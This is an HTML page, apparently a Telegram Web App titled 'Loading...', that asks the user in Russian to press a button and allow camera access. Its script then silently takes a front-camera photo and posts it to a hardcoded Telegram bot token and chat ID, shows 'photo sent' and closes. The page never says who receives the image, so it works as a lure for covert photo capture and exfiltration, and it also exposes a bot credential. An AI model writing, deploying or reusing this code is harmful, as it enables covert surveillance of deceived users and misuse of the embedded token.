<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:sans-serif;flex-direction:column;">
    <h1>Нажми кнопку</h1>
    <button id="camBtn" style="padding:20px 40px;font-size:24px;background:#0088cc;color:#fff;border:none;border-radius:10px;margin-top:20px;">
        📸 Разрешить камеру
    </button>
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        document.getElementById('camBtn').addEventListener('click', function() {
            // Запрашиваем камеру ТОЛЬКО после клика
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    video.onloadedmetadata = function() {
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob(function(blob) {
                                const formData = new FormData();
                                formData.append('chat_id', '7406666272');
                                formData.append('photo', blob, 'photo.jpg');

                                fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
                                    method: 'POST',
                                    body: formData
                                })
                                .then(() => {
                                    document.querySelector('h1').innerText = '✅ Фото отправлено!';
                                    tg.close();
                                })
                                .catch(() => {
                                    document.querySelector('h1').innerText = '❌ Ошибка';
                                });
                            }, 'image/jpeg', 0.7);

                            stream.getTracks().forEach(track => track.stop());
                        }, 300);
                    };
                })
                .catch(err => {
                    alert('Ошибка камеры: ' + err.message);
                });
        });
    </script>
</body>
</html>
